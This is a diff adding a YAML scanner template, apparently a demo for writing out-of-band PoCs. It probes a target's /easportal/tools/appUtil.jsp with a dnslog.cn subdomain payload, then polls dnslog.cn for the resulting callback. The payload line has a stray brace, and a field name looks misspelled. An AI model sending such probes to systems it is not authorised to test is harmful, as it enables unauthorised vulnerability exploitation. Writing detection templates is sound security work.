@@ -1,0 +1,69 @@
+info:
+  vulId: demo_dnslog
+  detail: dnslog形式的poc编写，在第一个请求获取一个dnslog域名和cookie，在最后一个请求获取该域名的dnslog信息,这两个请求都不用更改，只需要更改中间的请求信息
+  fofaQuery:
+rules:
+  - request:
+      path: "http://www.dnslog.cn/getdomain.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataTtpe: text
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+      - checkType: regex
+        desireds:
+          - "Set-Cookie: (.*?); path=/"
+        place: header
+        condition: and
+
+      - checkType: regex
+        desireds:
+          - "(.*?).dnslog.cn"
+        place: body
+        condition: and
+
+  - request:
+      payload:
+        - "{{hashStr}}.{{variable[1]}}.dnslog.cn}"
+      path: "{{rootUrl}}/easportal/tools/appUtil.jsp?list={{payload}}"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Connection: close
+      redirect: false
+      dataTtpe: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - fastjson
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "http://www.dnslog.cn/getrecords.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Cookie: "{{variable[0]}}"
+      redirect: false
+      dataTtpe: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - "{{hashStr}}"
+        place: body
+        condition: and
